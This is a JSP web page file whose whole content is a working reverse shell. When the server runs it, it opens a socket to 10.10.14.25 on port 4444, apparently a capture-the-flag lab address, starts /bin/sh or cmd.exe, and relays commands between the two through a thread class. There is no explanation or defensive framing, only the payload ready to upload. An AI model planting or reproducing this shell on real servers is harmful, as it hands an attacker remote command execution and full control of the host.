<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ui;
    OutputStream sm;

    StreamConnector( InputStream ui, OutputStream sm )
    {
      this.ui = ui;
      this.sm = sm;
    }

    public void run()
    {
      BufferedReader vz  = null;
      BufferedWriter ubj = null;
      try
      {
        vz  = new BufferedReader( new InputStreamReader( this.ui ) );
        ubj = new BufferedWriter( new OutputStreamWriter( this.sm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = vz.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ubj.write( buffer, 0, length );
          ubj.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( vz != null )
          vz.close();
        if( ubj != null )
          ubj.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.25", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
